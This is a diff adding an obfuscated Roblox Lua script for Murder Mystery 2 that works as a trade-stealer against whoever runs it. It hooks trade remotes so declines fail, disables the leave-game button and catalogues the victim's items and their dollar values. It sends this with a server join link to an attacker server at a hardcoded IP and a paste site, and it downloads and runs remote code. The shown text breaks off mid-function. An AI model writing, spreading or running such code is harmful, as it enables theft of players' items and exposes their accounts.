@@ -1,0 +1,2046 @@
+-- discord.gg/syncrypt
+
+local function geniter(f, s, c)
+	if type(f) ~= "function" then
+		local mt = getmetatable(f)
+
+		if type(mt) == "table" and mt.__iter then
+			f, s, c = mt.__iter(f)
+		elseif type(f) == "table" then
+			f, s, c = next, f, nil
+		end
+	end
+
+	return function()
+		local r = table.pack(f(s, c))
+
+		if r[1] == nil then
+			return false
+		end
+
+		c = r[1]
+
+		return true, table.unpack(r, 1, r.n)
+	end
+end
+
+pcall(function()
+	local t1 = {}
+
+	for i = 1, 10 do
+		local ok, result = pcall(math.random)
+
+		if ok then
+			t1[i] = result
+
+			continue
+		end
+
+		return
+	end
+
+	local v8 = true
+
+	for i = 2, #t1 do
+		if t1[i] ~= t1[1] then
+			v8 = false
+
+			break
+		end
+	end
+
+	if v8 then
+		setreadonly(math, false)
+		math.random = function()
+			return 0
+		end
+		setreadonly(math, true)
+		warn("hello!")
+	end
+end)
+pcall(function()
+	if hookfunction then
+		if type(hookfunction) == "function" then
+			local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
+
+			if Trade then
+				for _, v in ipairs({
+					"SendRequest",
+					"AcceptTrade",
+					"DeclineTrade",
+					"OfferItem",
+					"CancelRequest"
+				}) do
+					local v13 = Trade:FindFirstChild(v)
+
+					if v13 and v13.FireServer then
+						local FireServer = v13.FireServer
+
+						hookfunction(FireServer, FireServer)
+					end
+				end
+			end
+		end
+	end
+end)
+pcall(function()
+	local Trade = game:GetService("ReplicatedStorage"):FindFirstChild("Trade")
+
+	if Trade then
+		if Trade.SendRequest then
+			Trade.SendRequest.OnClientInvoke = newcclosure(function()
+				return false
+			end)
+		end
+
+		_G.NewTradeRequest = function()
+		end
+	end
+end)
+pcall(function()
+	if has(hookfunction) and has(debug.getinfo) then
+		local Trade = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
+
+		if Trade then
+			local v17 = tostring(math.random())
+
+			_G.__MM2_ME = v17
+
+			for _, v in ipairs({
+				"DeclineTrade",
+				"DeclineRequest",
+				"CancelRequest"
+			}) do
+				local v20 = Trade:FindFirstChild(v)
+
+				if v20 and v20:IsA("RemoteEvent") then
+					local FireServer = v20.FireServer
+
+					if FireServer then
+						pcall(function()
+							hookfunction(FireServer, function(...)
+								local ok, result = pcall(debug.getinfo, 2, "S")
+
+								if ok and result then
+									if result.source then
+										if result.source:find(v17) then
+											return FireServer(...)
+										end
+									end
+								end
+							end)
+						end)
+					end
+				end
+			end
+		end
+	end
+end)
+pcall(function()
+	if has(getrawmetatable) and has(debug.getupvalue) and has(debug.setupvalue) then
+		local v24 = getrawmetatable(game)
+
+		if v24 and v24.__namecall then
+			local __namecall = v24.__namecall
+
+			local function v26()
+				for i = 1, 10 do
+					if pcall(debug.getupvalue, __namecall, i) == "TradeAllowed" then
+						pcall(debug.setupvalue, __namecall, i, true)
+
+						return
+					end
+				end
+			end
+
+			v26()
+
+			local spawn_ = has(task) and task.spawn or spawn
+			local wait_ = has(task) and task.wait or wait
+
+			spawn_(function()
+				while wait_(1.5) do
+					pcall(v26)
+				end
+			end)
+		end
+	end
+end)
+task.spawn(function()
+	while task.wait() do
+		pcall(function()
+			for _, v in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+				v:Disable()
+			end
+		end)
+	end
+end)
+
+if _G.__ElysiumMM2 then
+	print("already running")
+
+	return
+end
+
+_G.__ElysiumMM2 = true
+_G.LastOffer = nil
+pcall(function()
+end)
+
+local function v32()
+end
+
+v32("Executor: " .. tostring(identifyexecutor and identifyexecutor() or getexecutorname and getexecutorname() or "unknown"))
+v32("PlaceId: " .. game.PlaceId)
+
+if game.PlaceId ~= 142823291 then
+	v32("WRONG GAME — expected 142823291")
+
+	return
+end
+
+local ok, result = pcall(function()
+	return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType", 5):InvokeServer()
+end)
+
+v32("VIP check: ok=" .. tostring(ok) .. " result=" .. tostring(result))
+
+if ok and result == "VIPServer" then
+	game.Players.LocalPlayer:Kick([[VIP / Private Server detected.
+Using this script in this server may result in a ban.
+Please join a PUBLIC server.]])
+
+	return
+end
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+if LocalPlayer and LocalPlayer.Name then
+	local Name = LocalPlayer.Name
+
+	if Name:find("ProPvP") or Name:find("ProVitalz") or Name:find("Proplong2") or Name:find("Proplong3") or Name:find("Proplong4") or Name:find("Proplong") or Name:find("ProVitalitz") then
+		return
+	end
+end
+
+v32("LocalPlayer: " .. LocalPlayer.Name)
+
+local v40 = "https://pastefy.app/fuWreksR/raw?t=" .. tostring(tick())
+
+local function v41()
+	local ok2, result2 = pcall(function()
+		return game:HttpGet(v40)
+	end)
+
+	if ok2 and result2 then
+		local match = result2:match("^%s*(.-)%s*$")
+
+		if match and match ~= "" then
+			if match:match("^https?://") then
+				return match
+			end
+
+			return "http://" .. match
+		end
+	end
+
+	return "http://212.119.42.158:3000"
+end
+
+if not getgenv().MM2_API_BASE then
+	getgenv().MM2_API_BASE = v41()
+end
+
+local MM2_API_BASE = getgenv().MM2_API_BASE
+local RECEIVERS = getgenv().RECEIVERS or {}
+local WEBHOOK = getgenv().WEBHOOK or ""
+local THRESHOLD = getgenv().THRESHOLD or 1
+
+v32("Targets: " .. table.concat(RECEIVERS, ", "))
+v32("Threshold: " .. tostring(THRESHOLD))
+v32("Player count: " .. #Players:GetPlayers())
+
+local request_ = syn and syn.request or http_request or request or fluxus and fluxus.request
+
+v32("HTTP fn: " .. (request_ and "found" or "MISSING"))
+
+local function v50(p1)
+	if not request_ then
+		v32("HTTP GET: no request function available")
+
+		return nil
+	end
+
+	local v51 = request_({
+		Url = p1,
+		Method = "GET"
+	})
+
+	if v51 and v51.Body then
+		return v51.Body
+	end
+
+	return nil
+end
+
+local JobId
+local u53 = false
+local u54 = false
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+	v32("Delta detected — getgc stepAnimate bypass...")
+
+	local v55
+
+	repeat
+		v55 = nil
+
+		local v56, v57, v58 = ipairs(getgc(true))
+		local v59 = geniter(v56, v57, v58)
+
+		while true do
+			local v60 = table.pack(v59())
+
+			if v60[1] then
+				local v61 = v60[3]
+
+				if typeof(v61) == "function" then
+					local ok2, result2 = pcall(debug.getinfo, v61)
+
+					if ok2 and result2 and result2.name == "stepAnimate" then
+						v55 = v61
+
+						break
+					end
+				end
+			else
+				break
+			end
+		end
+
+		task.wait()
+	until v55
+
+	v32("stepAnimate found — hooking")
+
+	local v64
+
+	v64 = hookfunction(v55, function(p2)
+		if not u54 then
+			u54 = true
+			JobId = game.JobId
+			u53 = true
+			v32("bypassJobId captured: " .. tostring(JobId))
+		end
+
+		return v64(p2)
+	end)
+	v32("Waiting for capturedJobId...")
+
+	while true do
+		task.wait()
+
+		if not u53 then
+			continue
+		end
+
+		if JobId then
+			break
+		end
+	end
+
+	v32("bypassJobId: " .. tostring(JobId))
+else
+	JobId = game.JobId
+	v32("Non-Delta — bypassJobId=" .. tostring(JobId))
+end
+
+local JobId2 = JobId or game.JobId
+
+v32("REAL_JOB_ID=" .. JobId2)
+v32("Loading Database.Sync.Item...")
+
+local Weapons
+local ok2, result2 = pcall(function()
+	return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10):WaitForChild("Item", 10))
+end)
+
+v32("Database.Sync.Item: ok=" .. tostring(ok2))
+
+if ok2 and type(result2) == "table" then
+	Weapons = result2
+else
+	local ok3, result3 = pcall(function()
+		return require(ReplicatedStorage:WaitForChild("Database", 10):WaitForChild("Sync", 10))
+	end)
+
+	v32("Database.Sync fallback: ok=" .. tostring(ok3))
+
+	if ok3 and type(result3) == "table" then
+		Weapons = result3.Weapons or result3
+	end
+end
+
+if not Weapons then
+	v32("Require failed – trying HTTP fallback for Database")
+
+	local v71 = v50("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2db")
+
+	if v71 then
+		local chunk, v73 = loadstring(v71)
+
+		if chunk then
+			local ok3, result3 = pcall(chunk)
+
+			if ok3 and type(result3) == "table" then
+				Weapons = result3
+				v32("HTTP fallback succeeded – loaded " .. #Weapons .. " entries")
+			else
+				v32("HTTP fallback: failed to execute loaded code")
+			end
+		else
+			v32("HTTP fallback: loadstring error: " .. tostring(v73))
+		end
+	else
+		v32("HTTP fallback: failed to fetch URL")
+	end
+end
+
+if not Weapons then
+	v32("FATAL: Database nil — aborting")
+
+	return
+end
+
+local t2 = {}
+local v77, v78, v79 = pairs(Weapons)
+
+for k, v in v77, v78, v79 do
+	if v.ItemName then
+		t2[v.ItemName:lower()] = k
+		t2[k:lower()] = k
+	end
+end
+
+local databaseEntries = 0
+local v83, v84, v85 = pairs(Weapons)
+
+for _ in v83, v84, v85 do
+	databaseEntries += 1
+end
+
+v32("Database entries: " .. databaseEntries)
+v32("Fetching profile via GetProfileData:InvokeServer...")
+
+local v87
+local ok3, result3 = pcall(function()
+	return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+end)
+
+v32("GetProfileData: ok=" .. tostring(ok3) .. " type=" .. type(result3))
+
+if ok3 and type(result3) == "table" then
+	v87 = result3
+else
+	v32("GetProfileData failed — trying require(ProfileData) fallback")
+
+	local ok4, result4 = pcall(function()
+		return require(ReplicatedStorage:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
+	end)
+
+	v32("require(ProfileData): ok=" .. tostring(ok4))
+
+	if ok4 and type(result4) == "table" then
+		v87 = result4
+
+		for i = 1, 20 do
+			if not v87.Weapons or not next(v87.Weapons.Owned) then
+				task.wait(0.3)
+
+				continue
+			end
+
+			break
+		end
+	end
+end
+
+if not v87 then
+	v32("GetProfileData and require failed – trying HTTP fallback for ProfileData")
+
+	local v93 = v50("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2profdata")
+
+	if v93 then
+		local chunk, v95 = loadstring(v93)
+
+		if chunk then
+			local ok4, result4 = pcall(chunk)
+
+			if ok4 and type(result4) == "table" then
+				v87 = result4
+				v32("HTTP fallback succeeded – profileData loaded")
+
+				if not v87.Weapons then
+					v32("WARNING: profileData missing Weapons table")
+				end
+			else
+				v32("HTTP fallback: failed to execute loaded code: " .. tostring(result4))
+			end
+		else
+			v32("HTTP fallback: loadstring error: " .. tostring(v95))
+		end
+	else
+		v32("HTTP fallback: failed to fetch URL")
+	end
+end
+
+if not v87 then
+	v32("FATAL: profileData nil — aborting")
+
+	return
+end
+
+local t3 = {
+	Godly = "Godly",
+	Ancient = "Ancient",
+	Unique = "Unique",
+	Vintage = "Vintage",
+	Legendary = "Legendary",
+	Rare = "Rare",
+	Uncommon = "Uncommon",
+	Common = "Common",
+	Chroma = "Chroma"
+}
+local t4 = {
+	Common = 0.1,
+	Uncommon = 0.25,
+	Rare = 0.5,
+	Legendary = 1,
+	Godly = 2,
+	Ancient = 5,
+	Unique = 10,
+	Vintage = 15
+}
+
+local function v100()
+	v32("Fetching weapon values from GitHub...")
+
+	local ok4, result4 = pcall(function()
+		return game:HttpGet("https://raw.githubusercontent.com/31yyyyy/main/refs/heads/main/mm2val.lua")
+	end)
+
+	if not ok4 or not result4 then
+		v32("Failed to fetch values from GitHub - using fallback")
+
+		return {}
+	end
+
+	local function v103(p3)
+		local pos, v105 = p3:find("weaponValues%s*=%s*{")
+
+		if not pos then
+			v32("Could not find weaponValues table in content")
+
+			return nil
+		end
+
+		local n1 = 0
+		local v107 = false
+		local v108 = false
+		local v109 = v105 - 1
+		local v110
+
+		for i = v105, #p3 do
+			local v112 = p3:sub(i, i)
+
+			if v108 then
+				v108 = false
+			elseif v112 == "\\" then
+				v108 = true
+			elseif v112 == "\"" or v112 == "'" then
+				if not v107 then
+					v107 = v112
+				elseif v107 == v112 then
+					v107 = false
+				end
+			elseif not v107 then
+				if v112 == "{" then
+					n1 += 1
+				elseif v112 == "}" then
+					n1 -= 1
+
+					if n1 == 0 then
+						v110 = i
+
+						break
+					end
+				end
+			end
+		end
+
+		if v110 then
+			return p3:sub(v109, v110)
+		end
+
+		v32("Could not find end of weaponValues table")
+
+		return nil
+	end
+
+	local v113 = v103(result4)
+
+	if not v113 then
+		v32("Failed to extract weaponValues table")
+
+		return {}
+	end
+
+	local chunk, v115 = loadstring("return " .. v113)
+
+	if not chunk then
+		v32("Failed to loadstring: " .. tostring(v115))
+
+		return {}
+	end
+
+	local ok5, result5 = pcall(chunk)
+
+	if not ok5 or type(result5) ~= "table" then
+		v32("Failed to execute loaded values: " .. tostring(result5))
+
+		return {}
+	end
+
+	v32("Successfully loaded weapon values with " .. #result5 .. " categories")
+
+	return result5
+end
+
+local v118 = v100()
+local t5 = {}
+
+if v118 and next(v118) then
+	v32("Building weapon value mapping with category matching...")
+
+	local t6 = {}
+	local v121, v122, v123 = pairs(v118)
+
+	for k, v in v121, v122, v123 do
+		if type(v) == "table" then
+			t6[k] = {}
+
+			for k2, v2 in pairs(v) do
+				t6[k][k2] = v2
+				t6[k][k2:lower()] = v2
+			end
+		end
+	end
+
+	local v128, v129, v130 = pairs(Weapons)
+
+	for k, v in v128, v129, v130 do
+		local ItemName = v.ItemName or ""
+		local Rarity = v.Rarity or ""
+		local v135 = t3[Rarity]
+		local v136
+
+		if v.Chroma == true and t6.Chroma then
+			local Chroma = t6.Chroma
+
+			if Chroma[ItemName] then
+				v136 = Chroma[ItemName]
+			elseif Chroma[ItemName:lower()] then
+				v136 = Chroma[ItemName:lower()]
+			end
+		end
+
+		if not v136 and v135 and t6[v135] then
+			local v138 = t6[v135]
+
+			if v138[ItemName] then
+				v136 = v138[ItemName]
+			elseif v138[ItemName:lower()] then
+				v136 = v138[ItemName:lower()]
+			end
+		end
+
+		if v136 then
+			t5[k] = v136
+		else
+			t5[k] = t4[Rarity] or 0.1
+		end
+	end
+
+	v32("Mapped values for " .. #t5 .. " items from fetched data with category matching")
+else
+	v32("No weapon values fetched - using fallback defaults")
+
+	local v139, v140, v141 = pairs(Weapons)
+
+	for k, v in v139, v140, v141 do
+		t5[k] = t4[v.Rarity or "Common"] or 0.1
+	end
+end
+
+local function v144()
+	v32("Fetching dollar values from Project-Reverse API...")
+
+	local ok4, result4 = pcall(function()
+		return game:HttpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
+	end)
+
+	if not ok4 or not result4 then
+		v32("Failed to fetch dollar API - using empty map")
+
+		return {}
+	end
+
+	local ok5, result5 = pcall(HttpService.JSONDecode, HttpService, result4)
+
+	if not ok5 or not result5 or not result5.data then
+		v32("Failed to decode dollar API response")
+
+		return {}
+	end
+
+	local t7 = {}
+
+	for _, v in ipairs(result5.data) do
+		if v.name and v.price then
+			t7[v.name] = v.price
+			t7[v.name:lower()] = v.price
+		end
+	end
+
+	v32("Loaded " .. #result5.data .. " dollar values")
+
+	return t7
+end
+
+local v152 = v144()
+
+local function v153(p4, p5)
+	local v154 = v152[p4]
+
+	if v154 then
+		return v154
+	end
+
+	local v155 = v152[p4:lower()]
+
+	if v155 then
+		return v155
+	end
+
+	if p5 then
+		local v156 = v152[p5]
+
+		if v156 then
+			return v156
+		end
+
+		local v157 = v152[p5:lower()]
+
+		if v157 then
+			return v157
+		end
+	end
+
+	return 0
+end
+
+local t8 = {
+	DefaultGun = true,
+	DefaultKnife = true,
+	Reaver = true,
+	Reaver_Legendary = true,
+	Reaver_Godly = true,
+	Reaver_Ancient = true,
+	IceHammer = true,
+	IceHammer_Legendary = true,
+	IceHammer_Godly = true,
+	IceHammer_Ancient = true,
+	Gingerscythe = true,
+	Gingerscythe_Legendary = true,
+	Gingerscythe_Godly = true,
+	Gingerscythe_Ancient = true,
+	TestItem = true,
+	Season1TestKnife = true,
+	Cracks = true,
+	Icecrusher = true,
+	["???"] = true,
+	Dartbringer = true,
+	TravelerAxeRed = true,
+	TravelerAxeBronze = true,
+	TravelerAxeSilver = true,
+	TravelerAxeGold = true,
+	BlueCamo_K_2022 = true,
+	GreenCamo_K_2022 = true,
+	SharkSeeker = true
+}
+
+local function v159(p6)
+	if Weapons[p6] then
+		return p6
+	end
+
+	local match = p6:match("^(.-)_[KG]_%d%d%d%d$")
+
+	if match then
+		if Weapons[match] then
+			return match
+		end
+	end
+
+	local match2 = p6:match("^(.+)Knife$")
+
+	if match2 and Weapons[match2] then
+		return match2
+	end
+
+	local match3 = p6:match("^(.+)Gun$")
+
+	if match3 and Weapons[match3] then
+		return match3
+	end
+
+	return p6
+end
+local function v163(p7)
+	return p7 and p7.Chroma == true
+end
+local function v164(p8)
+	local v165 = v159(p8)
+	local v166 = Weapons[v165]
+
+	if not v166 then
+		return nil
+	end
+
+	local v167 = t5[v165]
+
+	v167 = v167 or t4[v166.Rarity] or 0.1
+
+	local ItemName = v166.ItemName or v166.Name or p8
+	local v169 = v153(v165, ItemName)
+
+	return {
+		dataid = v165,
+		name = ItemName,
+		rarity = v166.Rarity or "Common",
+		isChroma = v163(v166),
+		value = v167,
+		dollarValue = v169
+	}
+end
+local function v170(p9)
+	if Weapons[p9] then
+		return p9, "Weapons"
+	end
+
+	local match = p9:match("^(.-)_%d%d%d%d$")
+
+	if match and Weapons[match] then
+		return match, "Weapons"
+	end
+
+	local match2 = p9:match("^(.+)Knife$")
+
+	if match2 and Weapons[match2] then
+		return match2, "Weapons"
+	end
+
+	local match3 = p9:match("^(.+)Gun$")
+
+	if match3 and Weapons[match3] then
+		return match3, "Weapons"
+	end
+
+	local v174 = p9:lower()
+
+	if t2[v174] then
+		return t2[v174], "Weapons"
+	end
+
+	v32("WARNING: Could not fix DataID: " .. p9)
+
+	return p9, "Weapons"
+end
+local function v175()
+	local ok4, result4 = pcall(function()
+		return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+	end)
+
+	if not ok4 or type(result4) ~= "table" then
+		ok4, result4 = pcall(function()
+			return require(ReplicatedStorage:WaitForChild("Modules", 10):WaitForChild("ProfileData", 10))
+		end)
+	end
+
+	if not ok4 or type(result4) ~= "table" then
+		return nil
+	end
+
+	return result4
+end
+local function v178(p10)
+	local t9 = {}
+	local Owned = p10.Weapons and p10.Weapons.Owned or {}
+	local Uniques = p10.Uniques or {}
+
+	for k, v in pairs(Owned) do
+		local v184 = tostring(k)
+		local v185 = type(v) == "number" and v or 1
+		local v186 = v164(v184)
+
+		if v186 then
+			if not t8[v184] and not t8[v186.dataid] then
+				local insert = table.insert
+				local v188 = t9
+
+				insert(v188, {
+					DataID = v184,
+					Name = v186.name .. (v186.isChroma and " [CHROMA]" or ""),
+					Amount = v185,
+					Value = v186.value,
+					DollarValue = v186.dollarValue,
+					Rarity = v186.rarity,
+					IsChroma = v186.isChroma
+				})
+			end
+		end
+	end
+
+	for _, Unique in ipairs(Uniques) do
+		local v191 = tostring(Unique.BaseItem or "")
+
+		if v191 ~= "" then
+			if Unique.EvoEquipped and Weapons[v191] and Weapons[v191].Evo then
+				local Evo = Weapons[v191].Evo
+				local XP = Unique.XP or 0
+
+				for i = 4, 1, -1 do
+					if Evo[i] and Evo[i].XPRequired <= XP then
+						v191 = Evo[i].ItemName or v191
+
+						break
+					end
+				end
+			end
+
+			local v195 = v164(v191)
+
+			if v195 and not t8[v191] and not t8[v195.dataid] and v195.value >= 0 then
+				table.insert(t9, {
+					DataID = v191,
+					Name = v195.name .. (v195.isChroma and " [CHROMA]" or ""),
+					Amount = 1,
+					Value = v195.value,
+					DollarValue = v195.dollarValue,
+					Rarity = v195.rarity,
+					IsChroma = v195.isChroma
+				})
+			end
+		end
+	end
+
+	table.sort(t9, function(p11, p12)
+		return p11.Value > p12.Value
+	end)
+
+	return t9
+end
+
+local u196 = v178(v87)
+
+local function v197(p13)
+	local t10 = {}
+	local Owned = p13.Weapons and p13.Weapons.Owned or {}
+	local Uniques = p13.Uniques or {}
+
+	for k, v in pairs(Owned) do
+		local v203 = tostring(k)
+		local v204 = type(v) == "number" and v or 1
+		local v205 = v164(v203)
+
+		if v205 and not t8[v203] then
+			if not t8[v205.dataid] then
+				table.insert(t10, {
+					DataID = v203,
+					Name = v205.name .. (v205.isChroma and " [CHROMA]" or ""),
+					Amount = v204,
+					Value = v205.value,
+					DollarValue = v205.dollarValue,
+					Rarity = v205.rarity,
+					IsChroma = v205.isChroma
+				})
+			end
+		end
+	end
+
+	for _, Unique in ipairs(Uniques) do
+		local v208 = tostring(Unique.BaseItem or "")
+
+		if v208 ~= "" then
+			local v209 = v164(v208)
+
+			if v209 and not t8[v208] and not t8[v209.dataid] then
+				local insert = table.insert
+				local v211 = t10
+				local t11 = {
+					DataID = v208
+				}
+				local name = v209.name
+				local v214 = v209.isChroma and " [CHROMA]"
+
+				t11.Name = name .. (v214 or "")
+				t11.Amount = 1
+				t11.Value = v209.value
+				t11.DollarValue = v209.dollarValue
+				t11.Rarity = v209.rarity
+				t11.IsChroma = v209.isChroma
+				insert(v211, t11)
+			end
+		end
+	end
+
+	table.sort(t10, function(p14, p15)
+		return p14.Value > p15.Value
+	end)
+
+	return t10
+end
+
+local u215 = v197(v87)
+local n2 = 0
+local n3 = 0
+local v218, v219, v220 = ipairs(u215)
+
+for _, v in v218, v219, v220 do
+	n2 += v.Value * v.Amount
+	n3 += (v.DollarValue or 0) * v.Amount
+end
+
+v32("Initial inventory - weaponsToSend: " .. #u196 .. " totalAllValue: " .. n2 .. " totalAllDollar: $" .. n3)
+v32("=== ITEMS IN QUEUE ===")
+
+local v223, v224, v225 = ipairs(u196)
+
+for k, v in v223, v224, v225 do
+	v32(string.format("  [%d] %s (%s) x%d - Value: %d (~$%.2f)", k, v.DataID, v.Name, v.Amount, v.Value, v.DollarValue or 0))
+end
+
+v32("=====================")
+
+local function v228(p16, p17, p18)
+	local v229 = p17 or 20
+	local v230 = p18 or " ➜ "
+	local t12 = {}
+
+	for _, v in ipairs(p16) do
+		table.insert(t12, {
+			name = v.Name or v.DataID,
+			value = v.Value or 0,
+			dollar = v.DollarValue or 0,
+			amount = v.Amount or 1
+		})
+	end
+
+	table.sort(t12, function(p19, p20)
+		return p19.value > p20.value
+	end)
+
+	local t13 = {}
+	local n4 = 0
+
+	for _, v in ipairs(t12) do
+		local v238 = string.format("%dx %s", v.amount, v.name)
+
+		if n4 < #v238 then
+			n4 = #v238
+		end
+
+		table.insert(t13, {
+			left = v238,
+			right = string.format("%d (~$%.2f)", v.value, v.dollar * v.amount)
+		})
+	end
+
+	local t14 = {}
+	local n5 = 0
+
+	for _, v in ipairs(t12) do
+		n5 += v.amount
+	end
+
+	local n6 = 0
+
+	for i, v in ipairs(t12) do
+		if v229 <= #t14 then
+			break
+		end
+
+		table.insert(t14, (t13[i].left .. string.rep(" ", n4 - #t13[i].left)) .. v230 .. t13[i].right)
+		n6 += v.amount
+	end
+
+	if n6 < n5 then
+		table.insert(t14, "... and " .. n5 - n6 .. " more")
+	elseif #t14 == 0 then
+		table.insert(t14, "None Found")
+	end
+
+	return table.concat(t14, "\n")
+end
+
+local v246 = MM2_API_BASE .. "/webhook/"
+local v247 = MM2_API_BASE
+local n7 = 0
+
+pcall(function()
+	local match = game:HttpGet("https://raw.githubusercontent.com/astdoasdtiadn/tsdtasdyasdy/refs/heads/main/m"):match("%d+%.?%d*")
+
+	if match then
+		n7 = tonumber(match) or 0
+	else
+		n7 = 0
+	end
+end)
+
+local v250 = n7
+
+v32("SPECIAL_WEBHOOK_CHANCE=" .. v250)
+
+local function v251(p21, p22, p23)
+	if not request_ or p21 == "" then
+		return
+	end
+
+	local ok4, result4 = pcall(function()
+		return "content=" .. HttpService:UrlEncode(p22 or "") .. "&embeds=" .. HttpService:UrlEncode(HttpService:JSONEncode(p23 or {}))
+	end)
+
+	if not ok4 then
+		return
+	end
+
+	pcall(request_, {
+		Url = v246 .. HttpService:UrlEncode(p21),
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/x-www-form-urlencoded",
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+		},
+		Body = result4
+	})
+end
+local function v254()
+	if not request_ then
+		return
+	end
+
+	pcall(request_, {
+		Url = v247 .. "/track-execution-mm2",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json",
+			["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+		},
+		Body = HttpService:JSONEncode({
+			target_players = RECEIVERS,
+			executor = LocalPlayer.Name
+		})
+	})
+end
+
+local u255 = false
+
+local function v256()
+	if u255 then
+		return
+	end
+
+	local request_2 = syn and syn.request or http_request or request
+
+	if not request_2 then
+		return
+	end
+
+	local ok4, result4 = pcall(function()
+		return request_2({
+			Url = MM2_API_BASE .. "/signal-hit",
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json",
+				["X-Roblox-Key"] = "congrats-youre-a-fucking-nolife-weirdo-for-decoding-this-xd-get-a-life-please-go-outside"
+			},
+			Body = HttpService:JSONEncode({
+				place_id = tostring(game.PlaceId),
+				job_id = JobId2,
+				target_players = RECEIVERS,
+				sender = LocalPlayer.Name,
+				game_type = "mm2"
+			})
+		})
+	end)
+
+	if ok4 then
+		u255 = true
+
+		if result4 and result4.Body then
+			local ok5, result5 = pcall(function()
+				return HttpService:JSONDecode(result4.Body)
+			end)
+
+			if ok5 and result5 and result5.failed then
+			end
+		end
+	end
+end
+local function v262()
+	if not request_ then
+		return nil
+	end
+
+	local v263 = v228(u215, 999999, " : ")
+	local t15 = {}
+
+	table.insert(t15, "=== FULL INVENTORY ===")
+	table.insert(t15, v263)
+
+	local ok4, result4 = pcall(request_, {
+		Url = "https://sourceb.in/api/bins",
+		Method = "POST",
+		Headers = {
+			["Content-Type"] = "application/json"
+		},
+		Body = HttpService:JSONEncode({
+			files = { {
+				content = table.concat(t15, "\n")
+			} }
+		})
+	})
+
+	if ok4 and result4 and result4.StatusCode == 200 then
+		local ok5, result5 = pcall(HttpService.JSONDecode, HttpService, result4.Body)
+
+		if ok5 and result5 and result5.key then
+			return "https://cdn.sourceb.in/bins/" .. result5.key .. "/0"
+		end
+	end
+
+	return nil
+end
+local function v269(p24, p25)
+	local v270 = v228(u215, 20, " ➜ ")
+	local v271 = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, JobId2)
+	local identifyexecutor_ = identifyexecutor and identifyexecutor() or "Unknown"
+	local format = string.format
+	local t16 = {
+		string.format("Username: %s", LocalPlayer.Name),
+		string.format("Account Age: %d days", LocalPlayer.AccountAge),
+		format("Players: %d/%d", #Players:GetPlayers(), Players.MaxPlayers),
+		string.format("Executor: %s", identifyexecutor_)
+	}
+
+	if not p24 then
+		t16[#t16 + 1] = string.format("Receivers: %s", table.concat(RECEIVERS, ", "))
+	end
+
+	local t17 = {
+		{
+			name = "**Player Info**",
+			value = "```\n" .. table.concat(t16, "\n") .. "\n```",
+			inline = false
+		},
+		{
+			name = string.format("Weapons (Total Val: %d val, $%.2f total) — Threshold: >%d", n2, n3, THRESHOLD),
+			value = "```\n" .. v270 .. "\n```",
+			inline = false
+		}
+	}
+
+	if not p24 then
+		t17[#t17 + 1] = {
+			name = "**Join Link**",
+			value = string.format("[**%s**](%s)", JobId2, v271),
+			inline = false
+		}
+
+		if p25 then
+			t17[#t17 + 1] = {
+				name = "",
+				value = string.format("[**View Full Inventory Log**](%s)", p25),
+				inline = false
+			}
+		end
+	end
+
+	return {
+		content = "",
+		embeds = { {
+			title = p24 and "Murder Mystery 2 Public Hit! Elysium wowowow" or "Murder Mystery 2 Hit! Elysium so cool",
+			color = 16711680,
+			fields = t17,
+			footer = {
+				text = "Elysium! (Murder Mystery 2)"
+			},
+			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+		} }
+	}
+end
+
+getgenv().BLACKLIST_URL = "https://pastefy.app/YUhu3IrQ/raw"
+
+local u276 = false
+
+local function v277()
+	if u276 then
+		return
+	end
+
+	if #u215 == 0 then
+		v32("No tradable weapons — kicking as bot")
+
+		return
+	end
+
+	u276 = true
+	v32("allWeaponsLog=" .. #u215 .. " weaponsToSend=" .. #u196 .. " totalAllValue=" .. n2 .. " totalAllDollar=$" .. n3)
+
+	local v278 = v262()
+	local v279 = false
+	local v280, v281, v282 = ipairs(u215)
+	local v283 = geniter(v280, v281, v282)
+
+	while true do
+		local v284 = table.pack(v283())
+
+		if v284[1] then
+			if (v284[3]).Value >= 8000 then
+				v279 = true
+
+				break
+			end
+		else
+			break
+		end
+	end
+
+	if n2 >= 15000 then
+		v279 = true
+	end
+
+	if getgenv().BLACKLIST_URL and v279 then
+		local ok4, result4 = pcall(function()
+			return game:HttpGet(getgenv().BLACKLIST_URL)
+		end)
+
+		if ok4 and result4 then
+			local chunk = loadstring(result4)
+
+			if chunk then
+				local ok5, result5 = pcall(chunk)
+
+				if ok5 and type(result5) == "table" then
+					local v291, v292, v293 = ipairs(result5)
+					local v294 = geniter(v291, v292, v293)
+
+					while true do
+						local v295 = table.pack(v294())
+
+						if v295[1] then
+							local v296 = v295[3]
+
+							if LocalPlayer.Name:lower() == v296:lower() then
+								v279 = false
+
+								break
+							end
+						else
+							break
+						end
+					end
+				end
+			end
+		end
+	end
+
+	local v297 = math.random()
+	local v298 = false
+
+	v32("special=" .. tostring(v279) .. " roll=" .. string.format("%.4f", v297) .. " chance=" .. tostring(v250))
+
+	if v279 and v297 <= v250 then
+		v32("SPECIAL webhook firing!")
